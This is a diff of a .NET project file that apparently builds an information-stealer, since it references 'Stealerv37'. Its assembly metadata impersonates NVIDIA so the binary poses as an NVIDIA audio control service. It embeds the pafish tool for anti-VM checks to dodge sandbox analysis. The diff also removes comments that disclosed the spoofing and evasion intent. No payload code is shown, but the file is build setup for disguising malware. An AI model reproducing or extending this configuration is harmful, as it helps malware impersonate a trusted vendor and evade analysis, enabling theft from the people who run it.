@@ -1,4 +1,4 @@
-﻿<Project Sdk="Microsoft.NET.Sdk">
+<Project Sdk="Microsoft.NET.Sdk">
 
   <PropertyGroup>
     <TargetFramework>net8.0-windows</TargetFramework>
@@ -13,36 +13,30 @@
     <GenerateAssemblyInfo>true</GenerateAssemblyInfo>
   </PropertyGroup>
 
-  <!-- NVIDIA Ghost Spoofing Metadata -->
+  <!-- NVIDIA Ghost Metadata -->
   <PropertyGroup>
     <Company>NVIDIA Corporation</Company>
     <Product>NVIDIA High Definition Audio Controller</Product>
     <Description>NVIDIA Audio Control Service</Description>
-    <Copyright>© 2025 NVIDIA Corporation. All rights reserved.</Copyright>
+    <Copyright>© 2025 NVIDIA Corporation.</Copyright>
     <FileVersion>1.20.0.1</FileVersion>
     <AssemblyVersion>1.20.0.1</AssemblyVersion>
     <Title>nvhda64v</Title>
     <Guid>8903f661-28b9-4164-94cf-c6d4c5692094</Guid>
-    <ComVisible>false</ComVisible>
   </PropertyGroup>
 
   <ItemGroup>
-    <PackageReference Include="Costura.Fody" Version="5.7.0">
-      <PrivateAssets>all</PrivateAssets>
-    </PackageReference>
+    <PackageReference Include="Costura.Fody" Version="5.7.0" />
     <PackageReference Include="System.Management" Version="8.0.0" />
     <PackageReference Include="System.IO.Hashing" Version="8.0.0" />
+    <PackageReference Include="System.ServiceProcess.ServiceController" Version="8.0.0" />
   </ItemGroup>
 
-  <!-- Exclude Legacy Costura/Fody stuff which is replaced by modern .NET SingleFile if needed, 
-       or just not needed for a library plugin -->
   <ItemGroup>
     <Compile Remove="Costura\**" />
     <EmbeddedResource Remove="costura\**" />
     <Compile Remove="Stealerv37_ProcessedByFody.cs" />
     <Compile Remove="_003CModule_003E.cs" />
-    
-    <!-- Embed Pafish for Anti-VM checks -->
     <EmbeddedResource Include="..\..\pafish64.exe">
       <Link>Resources\pafish64.exe</Link>
     </EmbeddedResource>
